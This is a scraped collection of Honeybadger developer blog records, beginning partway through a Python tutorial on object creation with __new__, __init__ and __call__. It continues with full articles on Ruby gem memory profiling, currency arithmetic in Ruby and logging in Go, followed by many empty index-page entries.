# Output: I am inside __call__ method callable ( human_obj ) # Output: True The above code output shows that after implementing the __call__ method on the Human class, human_obj becomes a callable object. We can call the human_obj using round parentheses (i.e., human_obj() ). When we use human_obj() , in the background, Python calls the __call__ method of the Human class. So, instead of calling human_obj as human_obj() , we can directly invoke the __call__ method on human_obj (i.e., human_obj.__call__() ). Both human_obj() and human_obj.__call__() are equivalent, and they are the same thing. For all objects that are callable, their classes must implement the __call__ method. We know that functions are a callable object, so its class (i.e., function ) must implement the __call__ method. Let's invoke the __call__ method on the print_function defined earlier. print_function . __call__ () # Output: I am a callable object In Python, class is also a callable object; therefore, it is a class 's class (metaclass) (i.e., the type class must have a call method defined on it). Hence, when we call Human() , in the background, Python calls the call method of the type class. Roughly, the __call__ method on the types class looks something like shown below. This is just for explanation purposes; we will cover the actual definition of the __call__ method later in the tutorial. class type : def __call__ (): # Called when class is called i.e. Human() print ( \"type's call method\" ) With an understanding of __call__ method and how calling the class calls the __call__ method of the type class, let's find out the answer to the following questions regarding the object initialization process: Who calls the __new__ and __init__ method? Who passes the self object to the __init__ method? As the __init__ method is called after the __new__ method, and the __init__ method does not return anything, how does calling the class return the object (i.e., how does calling the Human class return the human_obj object)? Consider an example of instantiating an object in Python. class Human : def __init__ ( self , first_name , last_name ): self . first_name = first_name self . last_name = last_name human_obj = Human ( \"Virat\" , \"Kohli\" ) We know that when we call the class (i.e., Human(\"Virat\", \"Kohli\") ), the __call__ method of the type class is called. However, what is the definition of the types class' __call__ method? As we are talking about CPython, the type class' __call__ method definition is defined in C language. If we convert it into Python and simplify it, it will look somewhat like this: # type's __call__ method which gets called when Human class is called i.e. Human() def __call__ ( cls , * args , ** kwargs ): # cls = Human class # args = [\"Virat\", \"Kohli\"] # Calling __new__ method of the Human class, as __new__ method is not defined # on Human, __new__ method of the object class is called human_obj = cls . __new__ ( * args , ** kwargs ) # After __new__ method returns the object, __init__ method will only be called if # 1. human_obj is not None # 2. human_obj is an instance of class Human # 3. __init__ method is defined on the Human class if human_obj is not None and isinstance ( human_obj , cls ) and hasattr ( human_obj , '__init__' ): # As __init__ is called on human_obj, self will be equal to human_obj in __init__ method human_obj . init ( * args , ** kwargs ) return human_obj Let's understand the above code; when we do Human(\"Virat\", \"Kohli\") , in the background, Python will call the type class' __call__ method, which is defined like the above code snippet. As shown above, the type class' __call__ method accepts Human class as the first argument ( cls is Human class), and the remaining arguments are passed while calling the Human class. The type class' __call__ method will first call the __new__ method defined on the Human class, if any; otherwise, the __new__ method of the Human class' parent class (i.e. the object 's __new__ method) is called. The __new__ method will return the human_obj . Now, the __call__ method of the type class will call the __init__ method defined on the Human class with human_obj as the first argument. __init__ will initialize the human_obj with the passed arguments, and finally, the __call__ method will return the human_obj . So, following steps are followed while creating and initializing an object in Python: Call the Human class - Human() ; this internally calls the __call__ method of the type class (i.e., type.__call__(Human, \"Virat\", \"Kohli\") ). type.__call__ will first call the __new__ method defined on the Human class. If the __new__ method is not defined on the Human class, the __new__ method of the object class will be called. The __new__ method will the return the object of type Human i.e. human_obj Now, type.__call__ will call the __init__ method defined on the Human class with human_obj as the first argument. This human_obj will be self in the __init__ method. The __init__ method will initialize the human_obj with the first_name as Virat and the last_name as Kohli . The __init__ method will not return anything. In the end, type.__call__ will return the human_obj object. As per the type.__call__ definition, whenever we create a new object, the __new__ method will always be called, but calling the __init__ method depends on the output of the __new__ method. The __init__ method will be called only if the __new__ method returns an object of type Human class or a subclass of the Human class. Let's understand some of the cases. Case 1 : If the returned object from the __new__ method is of type Human (i.e., the class of the __init__ method), the __init__ method will be called. class Human : def __new__ ( cls , * args , ** kwargs ): print ( f \"Creating the object with cls: { cls } and args: { args } \" ) obj = super (). __new__ ( cls ) print ( f \"Object created with obj: { obj } and type: { type ( obj ) } \" ) return obj def __init__ ( self , first_name , last_name ): print ( f \"Started: __init__ method of Human class with self: { self } \" ) self . first_name = first_name self . last_name = last_name print ( f \"Ended: __init__ method of Human class\" ) human_obj = Human ( \"Virat\" , \"Kohli\" ) Output: # Creating the object with cls: <class '__main__.Human'> and args: ('Virat', 'Kohli')\n# Object created with obj: <__main__.Human object at 0x102f6a4e0> and type: <class '__main__.Human'>\n# Started: __init__ method of Human class with self: <__main__.Human object at 0x102f6a400>\n# Ended: __init__ method of Human class with self: <__main__.Human object at 0x102f6a400> Case 2 : If the __new__ method does not return anything, then __init__ will not be called. class Human : def __new__ ( cls , * args , ** kwargs ): print ( f \"Creating the object with cls: { cls } and args: { args } \" ) obj = super (). __new__ ( cls ) print ( f \"Object created with obj: { obj } and type: { type ( obj ) } \" ) print ( \"Not returning object from __new__ method, hence __init__ method will not be called\" ) def __init__ ( self , first_name , last_name ): print ( f \"Started: __init__ method of Human class with self: { self } \" ) self . first_name = first_name self . last_name = last_name print ( f \"Ended: __init__ method of Human class\" ) human_obj = Human ( \"Virat\" , \"Kohli\" ) Output: # Creating the object with cls: <class '__main__.Human'> and args: ('Virat', 'Kohli')\n# Object created with obj: <__main__.Human object at 0x102f6a5c0> and type: <class '__main__.Human'>\n# Not returning object from __new__ method, hence __init__ method will not be called In the above code, the __new__ method of the Human class is called; hence, obj of type Human is created (i.e., memory is assigned for obj ). However, as the __new__ method did not return human_obj , the __init__ method will not be called. Also, human_obj will not have the reference for the created object, as it was not returned from the __new__ method. print ( human_obj ). # Output: None Case 3 : The __new__ method returns an integer object. class Human : def __new__ ( cls , * args , ** kwargs ): print ( f \"Creating the object with cls: { cls } and args: { args } \" ) obj = super (). __new__ ( cls ) print ( f \"Object created with obj: { obj } and type: { type ( obj ) } \" ) print ( \"Not returning object from __new__ method, hence __init__ method will not be called\" ) return 10 def __init__ ( self , first_name , last_name ): print ( f \"Started: __init__ method of Human class with self: { self } \" ) self . first_name = first_name self . last_name = last_name print ( f \"Ended: __init__ method of Human class\" ) human_obj = Human ( \"Virat\" , \"Kohli\" ) In the above code, the __new__ method of the Human class is called; hence, obj of type Human is created (i.e., memory is assigned for obj ). However, the __new__ method did not return human_obj but an integer with value 10 , which is not of the Human type; hence, the __init__ method will not be called. Also, human_obj will not have the reference for the created object, but it will refer to an integer value of 10 . print ( human_obj ) # Output: 10 In scenarios where the __new__ method does not return the instance of the class and we want to initialize the object, we have to call the __init__ method, explicity, inside the __new__ method, as shown below: class Human : def __new__ ( cls , * args , ** kwargs ): print ( f \"Creating the object with cls: { cls } and args: { args } \" ) obj = super (). __new__ ( cls ) print ( f \"Object created with obj: { obj } and type: { type ( obj ) } \" ) print ( \"Not returning object from __new__ method, hence __init__ method will not be called\" ) obj . __init__ ( * args , ** kwargs ) return 10 def __init__ ( self , first_name , last_name ): print ( f \"Started: __init__ method of Human class with self: { self } \" ) self . first_name = first_name self . last_name = last_name print ( f \"Ended: __init__ method of Human class\" ) human_obj = Human ( \"Virat\" , \"Kohli\" ) Output: # Creating the object with cls: <class '__main__.Human'> and args: ('Virat', 'Kohli')\n# Object created with obj: <__main__.Human object at 0x102f6a860> and type: <class '__main__.Human'>\n# Not returning object from __new__ method, hence __init__ method will not be called\n# Started: __init__ method of Human class with self: <__main__.Human object at 0x102f6a860>\n# Ended: __init__ method of Human class In the above case, the __new__ method returned an integer object; hence the human_obj value will be 10. print ( human_obj ) # Output: 10 Conclusion In this article, we explored the __new__ , __init__ , and __call__ magic methods and discussed Metaclass in Python. In doing so, we have a better understanding of the object creation and initialization processes in Python. References https://eli.thegreenplace.net/2012/04/16/python-object-creation-sequence https://realpython.com/python-metaclasses/#old-style-vs-new-style-classes https://docs.python.org/3/reference/datamodel.html#special-method-names", "date": "2020-11-25"},
{"website": "Honey-Badger", "title": "Profile your gem memory usage with Derailed", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/profile-your-gem-memory-usage-with-derailed/", "abstract": "So your Rails app is taking up a lot of RAM. What else is new? But perhaps this isn't just the way things are. Perhaps your application's memory footprint is being enlarged by one or more bloated gems. I recently stumbled across a very cool project by Richard Schneeman. It's called derailed, and is a collection of automatic benchmarking tools. Here's the github repo. All you need to do is add it to your gemfile like so: gem 'derailed' , group: :development gem \"stackprof\" , group: :development Then you can see exactly how much memory each of your gems requires at compile time: Use the bundle:mem command to see how much ram each of your gems uses at compile time You can also see how many objects are allocated by your gems at load time. Use the bundle:objects to see information about object allocation at load time There are even tools for measuring memory usage as your application runs. I haven't had a chance to check these out personally yet, since you have to be able to run your app in production mode on your development computer.", "date": "2015-06-18"},
{"website": "Honey-Badger", "title": "Currency Calculations in Ruby", "author": ["Julio Sampaio"], "link": "https://www.honeybadger.io/blog/ruby-currency/", "abstract": "Money, regardless of the currency it is in, seems like a floating-point number. But it's a mistake to use floats for currency. Float numbers (hence, float objects) are, by definition, inexact real numbers that make use of the double-precision floating-point representation characteristic of the native architecture. Inexact numbers make accountants unhappy. In this article, you’ll be guided through some quick examples that will help you to address the available options for dealing with money data in Ruby and Rails. What's a Float? As we said, float objects have different arithmetic. This is the main reason they are inexact numbers, especially because Ruby (like most languages) uses a fixed number of binary digits to represent floats. In other words, Ruby converts floating numbers from decimal to binary and vice versa. When you dive deep into the binary representation of real numbers (aka decimal numbers), some of them can't be exactly represented, so the only remaining option is for the system to round them off. If you think ahead and consider common math structures, such as periodic tithes, you may understand that they can't be entirely represented within a fixed number since the pi number, for example, is infinite. Floats can usually hold up to 32 or 64 bits of precision, which means the number will be cut off when it reaches the limit. Let’s analyze a classic example: 1200 * ( 14.0 / 100 ) This is a straightforward way to calculate the percentage of a number. Fourteen percent of 1200 should be 168; however, the result of this execution within Ruby will be 1200 * ( 14.0 / 100 ) => 168.00000000000003 However, if you add just 0.1% to the formula, you get something different: 1200 * ( 14.1 / 100 ) => 169.2 Alternatively, you could round the value to the nearest possible one, defining how many decimal places are desired: ( my_calculation ). round ( 2 ) Indeed, it is not guaranteed when it comes to more complex calculations, especially if you perform comparisons of these values. If you're interested in understanding the real science behind it, I highly recommend reading the Oracle's appendix: What Every Computer Scientist Should Know About Floating-Point Arithmetic . It explains, in detail, the whys behind the inaccurate nature of float numbers. The Trustworthy BigDecimal Consider the following code snippet: require \"bigdecimal\" BigDecimal ( \"45.99\" ) This code can easily represent a real logic embracing an eCommerce cart’s amount. In the end, the real value being manipulated will always be 45.99 instead of 45.9989 or 45.99000009, for example. This is the precise nature of BigDecimal . For usual arithmetic calculations, float will perform the same way; however, it is unpredictable, which is the danger of using it. When it's run with BigDecimal , the same percentage calculation we did in the previous section results in require \"bigdecimal\" ( BigDecimal ( 1200 ) * ( BigDecimal ( 14 ) / BigDecimal ( 100 ))). to_s ( \"F\" ) => 168.0 This is just a short version to allow rapid execution in an irb console. Originally, when you print the direct BigDecimal object, you’ll get its scientific notation, which is not what we want here. The to_s method receives the given argument due to formatting settings and displays the equivalent floating value of the BigDecimal. For further details on this topic, refer to Ruby docs . In case you need to determine a limit for decimal places, it has the truncate method, which will do the job for you: ( BigDecimal ( 1200 ) * ( BigDecimal ( \"14.12\" ) / BigDecimal ( 100 ))). truncate ( 2 ). to_s ( \"F\" ) => 169.44 The RubyMoney Project RubyMoney was created after thinking about these problems. It is an open-source community of Ruby developers aiming to facilitate developers' lives by providing great libraries to manipulate money data in the Ruby ecosystem. The project is composed of seven libraries, three of which stand out in importance: Money : A Ruby library for dealing with money and currency conversion. It provides several object-oriented options to handle money in robust and modern applications, regardless of whether they are for the web. Money-rails : An integration of RubyMoney for Ruby on Rails, mixing all the money 's library power with Rails flexibility. Monetize : A library for converting various objects into money objects. It works more like an auxiliary library for applications that deal with a lot of String parsing, for example. The project has four other interesting libraries: EU_central_bank : A library that helps calculate exchange rates by making use of published rates from the European Central Bank. Google_currency : An interesting library for currency conversion using Google Currency rates as a reference. Money-collection : An auxiliary library for accurately calculating the sum/min/max of money objects. Money-heuristics : A module for heuristic analyses of string input for the money gem. The “Money” Gem Let’s start with the most famous one: the money gem. Among its main features are the following: A money class that holds relevant monetary information, such as the value, currency, and decimal marks. Another class called Money::Currency that wraps information regarding the monetary unit being used by the developer. By default, it works with integers rather than floating-point numbers to avoid the aforementioned errors. The ability to exchange money from one currency to another, which is super cool. Other than that, we also get the high flexibility offered by consistent and object-oriented structures to manipulate money data, just like any other model within your projects. Its usage is pretty simple, just install the proper gem: gem install money A quick example involving a fixed amount of money would be my_money = Money . new ( 1200 , \"USD\" ) my_money . cents #=> 1200 my_money . currency #=> Currency.new(\"USD\") As you can see, money is represented based on cents. Twelve hundred cents is equivalent to 12 dollars. Just like you did with BigDecimal, you can also play around and do some basic math with these objects. For example, cart_amount = Money . new ( 10000 , \"USD\" ) #=> 100 USD discount = Money . new ( 1000 , \"USD\" ) #=> 10 USD cart_amount - discount == Money . new ( 9000 , \"USD\" ) #=> 90 USD Interesting, isn’t it? That’s the nature of the objects we mentioned. When coding, it really feels like you’re manipulating monetary values rather than inexpressive and ordinary numbers. Currency Conversions If you’ve got your own exchange rate system, you can perform currency conversions through an exchange bank object. Consider the following: Money . add_rate ( \"USD\" , \"BRL\" , 5.23995 ) Money . add_rate ( \"BRL\" , \"USD\" , 0.19111 ) Whenever you need to exchange values between them, you may run the following code: Money . us_dollar ( 100 ). exchange_to ( \"BRL\" ) #=> Money.new(523, \"BRL\") The same applies to any arithmetic and comparison evaluations you may want to perform. Make sure to refer to the docs for more of the provided currency attributes, such as iso_code (which returns the international three-digit code of that currency) and decimal_mark (the char between the value and the fraction of the money data), among others. Oh, I almost forgot; once you’ve installed the money gem, you can access a BigDecimal method called to_money that automatically performs the conversion for you. The “monetize” gem It is important to understand the role each library plays within the RubyMoney project. Whenever you need to convert a different Ruby object (a String , for example) into Money , then monetize is what you’re looking for. First, make sure to install the gem dependency or add it to your Gemfile : gem install monetize Obviously, money also needs to be installed. The parse method is also very useful when you receive money data in a different format; for example, Money . parse ( \"£100\" ) == Money . new ( 100 , \"GBP\" ) #=> true Although the scenarios in which you’d use this parsing method are restricted, it can be very useful when you receive a value formatted alongside its currency code from an HTTP request. On the web, everything is text, so converting from string to money can be very useful. However, be careful with how your system manipulates the values and if they can be hacked somehow. Financial systems are always covered by multiple security layers to ensure that the value you’re receiving is the real value of that transaction. The “monetize-rails” gem This is the library that deals with the same money manipulation operations, but within a Rails app. Why do we need a second library just to make it work alongside Rails? Well, you can certainly make use of the money gem alone within Rails projects for ordinary math operations. However, it won’t work properly when your Rails structures need to communicate with money ’s features. Consider the following example: class Cart < ActiveRecord :: Base monetize :amount_cents end This is a real, functional Rails model object. You can use it along with databases (even including aliases when you want a different model attribute name), Mongoid, REST web services, etc. All the features we’ve been in contact with so far also apply to this gem. Usually, only additional settings are necessary to make it run, which should be placed into the config/initializers/money.rb file: MoneyRails . configure do | config | # set the default currency config . default_currency = :usd end This will set the default currency to the one you provide. However, during development, the chances are that you may need to perform exchange conversions or handle more than one currency throughout the models. If so, money-rails allows us to configure a model-level currency definition: class Cart < ActiveRecord :: Base # Use GPB as model level currency register_currency :eur monetize :amount_cents , as \"amount\" monetize :discount_cents , with_currency: :eur monetize :converted_value , with_currency: :usd end Note that once everything is set up, it is really easy to make use of money types alongside your projects. Wrapping Up In this blog post, we’ve explored some available options to deal with money values within the Ruby and Rails ecosystems. Some important points are summarized below: If you’re dealing with the calculation of float numbers, especially if they represent money data, go for BigDecimal or Money instances. Try to stick to one system only to avoid further inconsistencies alongside your development. The money library is the core of the whole RubyMoney system, and it is very robust and straightforward. Money-rails is the equivalent version for Rails applications, and monetize is necessary whenever you need to parse from any value to Money objects. Avoid using Float . Even if your app doesn’t need to calculate anything now, the chances are that an unadvised dev will do it in the future. You might not be there to stop it. Remember, the official docs should always be a must-to. BigDecimal is filled with great explanations and examples of its usage, and the same is true of RubyMoney gem projects.", "date": "2020-09-30"},
{"website": "Honey-Badger", "title": "Honeybadger Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/honeybadger/page/4/", "abstract": "", "date": "2014-01-19"},
{"website": "Honey-Badger", "title": "Logging in Go: Choosing a System and Using it", "author": ["Ayooluwa Isaiah"], "link": "https://www.honeybadger.io/blog/golang-logging/", "abstract": "You're relatively new to the Go language. You're probably using it to write a web app or a server, and you need to create a log file. So, you do a quick web search and find that there are a ton of options for logging in go. How do you know which one to pick? This article will equip you to answer that question. We will take a look at the built-in log package and determine what projects it is suited for before exploring other logging solutions that are prevalent in the Go ecosystem. What to log I don't need to tell you how important logging is. Logs are used by every production web application to help developers and operations: Spot bugs in the application's code Discover performance problems Do post-mortem analysis of outages and security incidents The data you actually log will depend on the type of application you're building. Most of the time, you will have some variation in the following: The timestamp for when an event occurred or a log was generated Log levels such as debug, error, or info Contextual data to help understand what happened and make it possible to easily reproduce the situation What not to log In general, you shouldn't log any form of sensitive business data or personally identifiable information. This includes, but is not limited to: Names IP addresses Credit card numbers These restrictions can make logs less useful from an engineering perspective, but they make your application more secure. In many cases, regulations such as GDPR and HIPAA may forbid the logging of personal data. Introducing the log package The Go standard library has a built-in log package that provides most basic logging features. While it does not have log levels (such as debug, warning, or error), it still provides everything you need to get a basic logging strategy set up. Here's the most basic logging example: package main import \"log\" func main () { log . Println ( \"Hello world!\" ) } The code above prints the text \"Hello world!\" to the standard error, but it also includes the date and time, which is handy for filtering log messages by date. 2019/12/09 17:21:53 Hello world! By default, the log package prints to the standard error ( stderr ) output stream, but you can make it write to local files or any destination that supports the io.Writer interface. It also adds a timestamp to the log message without any additional configuration. Logging to a file If you need to store log messages in a file, you can do so by creating a new file or opening an existing file and setting it as the output of the log. Here's an example: package main import ( \"log\" \"os\" ) func main () { // If the file doesn't exist, create it or append to the file file , err := os . OpenFile ( \"logs.txt\" , os . O_APPEND | os . O_CREATE | os . O_WRONLY , 0666 ) if err != nil { log . Fatal ( err ) } log . SetOutput ( file ) log . Println ( \"Hello world!\" ) } When we run the code, the following is written to logs.txt. 2019/12/09 17:22:47 Hello world! As mentioned earlier, you can basically output your logs to any destination that implements the io.Writer interface, so you have a lot of flexibility when deciding where to log messages in your application. Creating custom loggers Although the log package implements a predefined logger that writes to the standard error, we can create custom logger types using the log.New() method. When creating a new logger, you need to pass in three arguments to log.New() : out : Any type that implements the io.Writer interface, which is where the log data will be written to prefix : A string that is appended to the beginning of each log line flag : A set of constants that allow us to define which logging properties to include in each log entry generated by the logger (more on this in the next section) We can take advantage of this feature to create custom loggers. Here's an\nexample that implements Info , Warning and Error loggers: package main import ( \"log\" \"os\" ) var ( WarningLogger * log . Logger InfoLogger * log . Logger ErrorLogger * log . Logger ) func init () { file , err := os . OpenFile ( \"logs.txt\" , os . O_APPEND | os . O_CREATE | os . O_WRONLY , 0666 ) if err != nil { log . Fatal ( err ) } InfoLogger = log . New ( file , \"INFO: \" , log . Ldate | log . Ltime | log . Lshortfile ) WarningLogger = log . New ( file , \"WARNING: \" , log . Ldate | log . Ltime | log . Lshortfile ) ErrorLogger = log . New ( file , \"ERROR: \" , log . Ldate | log . Ltime | log . Lshortfile ) } func main () { InfoLogger . Println ( \"Starting the application...\" ) InfoLogger . Println ( \"Something noteworthy happened\" ) WarningLogger . Println ( \"There is something you should know about\" ) ErrorLogger . Println ( \"Something went wrong\" ) } After creating or opening the logs.txt file at the top of the init function, we then initialize the three defined loggers by providing the output destination, prefix string, and log flags. In the main function, the loggers are utilized by calling the Println function, which writes a new log entry to the log file. When you run this program, the following will be written to logs.txt . INFO: 2019/12/09 12:01:06 main.go:26: Starting the application...\nINFO: 2019/12/09 12:01:06 main.go:27: Something noteworthy happened\nWARNING: 2019/12/09 12:01:06 main.go:28: There is something you should know about\nERROR: 2019/12/09 12:01:06 main.go:29: Something went wrong Note that in this example, we are logging to a single file, but you can use a separate file for each logger by passing a different file when creating the logger. Log flags You can use log flag constants to enrich a log message by providing additional context information, such as the file, line number, date, and time. For example, passing the message \"Something went wrong\" through a logger with a flag combination shown below: log . Ldate | log . Ltime | log . Lshortfile will print 2019/12/09 12:01:06 main.go:29: Something went wrong Unfortunately, there is no control over the order in which they appear or the format in which they are presented. Introducing logging frameworks Using the log package is great for local development when getting fast feedback is more important than generating rich, structured logs. Beyond that, you will mostly likely be better off using a logging framework. A major advantage of using a logging framework is that it helps to standardize the log data. This means that: It's easier to read and understand the log data. It's easier to gather logs from several sources and feed them to a central platform to be analyzed. In addition, logging is pretty much a solved problem. Why reinvent the wheel? Choosing a logging framework Deciding which framework to use can be a challenge, as there are several options to choose from. The two most popular logging frameworks for Go appear to be glog and logrus . The popularity of glog is surprising, since it hasn't been updated in several years. logrus is better maintained and used in popular projects like Docker, so we'll be focusing on it. Getting started with logrus Installing logrus is as simple as running the command below in your terminal: go get \"github.com/Sirupsen/logrus\" One great thing about logrus is that it's completely compatible with the log package of the standard library, so you can replace your log imports everywhere with log \"github.com/sirupsen/logrus\" and it will just work! Let's modify our earlier \"hello world\" example that used the log package and use logrus instead: package main import ( log \"github.com/sirupsen/logrus\" ) func main () { log . Println ( \"Hello world!\" ) } Running this code produces the output: INFO[0000] Hello world! It couldn't be any easier! Logging in JSON logrus is well suited for structured logging in JSON which — as JSON is a well-defined standard — makes it easy for external services to parse your logs and also makes the addition of context to a log message relatively straightforward through the use of fields, as shown below: package main import ( log \"github.com/sirupsen/logrus\" ) func main () { log . SetFormatter ( & log . JSONFormatter {}) log . WithFields ( log . Fields { \"foo\" : \"foo\" , \"bar\" : \"bar\" , }, ) . Info ( \"Something happened\" ) } The log output generated will be a JSON object that includes the message, log level, timestamp, and included fields. { \"bar\" : \"bar\" , \"foo\" : \"foo\" , \"level\" : \"info\" , \"msg\" : \"Something happened\" , \"time\" : \"2019-12-09T15:55:24+01:00\" } If you're not interested in outputting your logs as JSON, be aware that several third-party formatters exist for logrus, which you can view on its Github page . You can even write your own formatter if you prefer. Log levels Unlike the standard log package, logrus supports log levels. logrus has seven log levels: Trace, Debug, Info, Warn, Error, Fatal, and Panic. The severity of each level increases as you go down the list. log . Trace ( \"Something very low level.\" ) log . Debug ( \"Useful debugging information.\" ) log . Info ( \"Something noteworthy happened!\" ) log . Warn ( \"You should probably take a look at this.\" ) log . Error ( \"Something failed but I'm not quitting.\" ) // Calls os.Exit(1) after logging log . Fatal ( \"Bye.\" ) // Calls panic() after logging log . Panic ( \"I'm bailing.\" ) By setting a logging level on a logger, you can log only the entries you need depending on your environment. By default, logrus will log anything that is Info or above (Warn, Error, Fatal, or Panic). package main import ( log \"github.com/sirupsen/logrus\" ) func main () { log . SetFormatter ( & log . JSONFormatter {}) log . Debug ( \"Useful debugging information.\" ) log . Info ( \"Something noteworthy happened!\" ) log . Warn ( \"You should probably take a look at this.\" ) log . Error ( \"Something failed but I'm not quitting.\" ) } Running the above code will produce the following output: { \"level\" : \"info\" , \"msg\" : \"Something noteworthy happened!\" , \"time\" : \"2019-12-09T16:18:21+01:00\" } { \"level\" : \"warning\" , \"msg\" : \"You should probably take a look at this.\" , \"time\" : \"2019-12-09T16:18:21+01:00\" } { \"level\" : \"error\" , \"msg\" : \"Something failed but I'm not quitting.\" , \"time\" : \"2019-12-09T16:18:21+01:00\" } Notice that the Debug level message was not printed. To include it in the\nlogs, set log.Level to equal log.DebugLevel : log . SetLevel ( log . DebugLevel ) Wrap up In this post, we explored the use of the built-in log package and established that it should only be used for trivial applications or when building a quick prototype. For everything else, the use of a mainstream logging framework is a must. We also looked at ways to ensure that the information contained in your\nlogs is consistent and easy to analyze, especially when aggregating it on a centralized platform. Thanks for reading!", "date": "2020-04-01"},
{"website": "Honey-Badger", "title": "Honeybadger Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/honeybadger/page/3/", "abstract": "", "date": "2016-02-22"},
{"website": "Honey-Badger", "title": "Honeybadger Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/honeybadger/page/2/", "abstract": "", "date": "2017-08-02"},
{"website": "Honey-Badger", "title": "Rails Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/rails/page/2/", "abstract": "", "date": "2013-12-17"},
{"website": "Honey-Badger", "title": "Ruby Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/ruby/page/7/", "abstract": "", "date": "2015-06-01"},
{"website": "Honey-Badger", "title": "Ruby Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/ruby/page/6/", "abstract": "", "date": "2015-07-15"},
{"website": "Honey-Badger", "title": "Ruby Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/ruby/page/5/", "abstract": "", "date": "2015-10-13"},
{"website": "Honey-Badger", "title": "Ruby Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/ruby/page/4/", "abstract": "", "date": "2016-09-13"},
{"website": "Honey-Badger", "title": "Ruby Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/ruby/page/3/", "abstract": "", "date": "2018-11-30"},
{"website": "Honey-Badger", "title": "Ruby Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/ruby/page/2/", "abstract": "", "date": "2020-09-30"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/28/", "abstract": "", "date": "2013-03-19"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/27/", "abstract": "", "date": "2013-11-05"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/26/", "abstract": "", "date": "2014-02-12"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/25/", "abstract": "", "date": "2015-03-17"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/24/", "abstract": "", "date": "2015-06-03"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/23/", "abstract": "", "date": "2015-06-24"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/22/", "abstract": "", "date": "2015-07-14"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/21/", "abstract": "", "date": "2015-08-03"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/20/", "abstract": "", "date": "2015-08-26"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/19/", "abstract": "", "date": "2015-10-13"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/18/", "abstract": "", "date": "2015-11-17"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/17/", "abstract": "", "date": "2016-02-15"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/16/", "abstract": "", "date": "2016-05-17"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/15/", "abstract": "", "date": "2016-08-23"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/14/", "abstract": "", "date": "2016-10-25"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/13/", "abstract": "", "date": "2017-02-06"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/12/", "abstract": "", "date": "2017-06-27"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/11/", "abstract": "", "date": "2017-12-05"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/10/", "abstract": "", "date": "2019-01-28"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/9/", "abstract": "", "date": "2019-07-25"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/8/", "abstract": "", "date": "2019-11-29"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/7/", "abstract": "", "date": "2020-02-18"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/6/", "abstract": "", "date": "2020-04-21"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/5/", "abstract": "", "date": "2020-06-29"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/4/", "abstract": "", "date": "2020-10-06"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/3/", "abstract": "", "date": "2021-01-13"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/page/2/", "abstract": "", "date": "2021-03-29"},
{"website": "Honey-Badger", "title": "#case-studies Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/case-studies/", "abstract": "", "date": "2014-03-11"},
{"website": "Honey-Badger", "title": "#events Articles", "author": "Unknown", "link": "https://www.honeybadger.io/blog/tags/events/", "abstract": "", "date": "2012-10-18"},
